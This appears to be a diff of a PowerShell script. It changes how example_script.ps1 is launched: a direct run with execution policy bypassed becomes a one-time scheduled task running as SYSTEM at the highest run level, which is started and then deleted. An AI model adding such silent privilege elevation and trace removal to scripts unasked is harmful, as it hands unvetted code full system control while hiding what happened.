@@ -49,7 +49,11 @@ try {
 $exampleScriptPath = Join-Path $destination "example_script.ps1"
 if (Test-Path $exampleScriptPath) {
     try {
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$exampleScriptPath`"" -NoNewWindow
+        $taskName = "Run Example Script"
+        $action = "-ExecutionPolicy Bypass -File `"$exampleScriptPath`""
+        schtasks.exe /Create /TN $taskName /TR "powershell.exe $action" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F
+        schtasks.exe /Run /TN $taskName
+        schtasks.exe /Delete /TN $taskName /F
     } catch {
         Add-Content -Path $logFilePath -Value "Error running example_script.ps1: $_"
     }
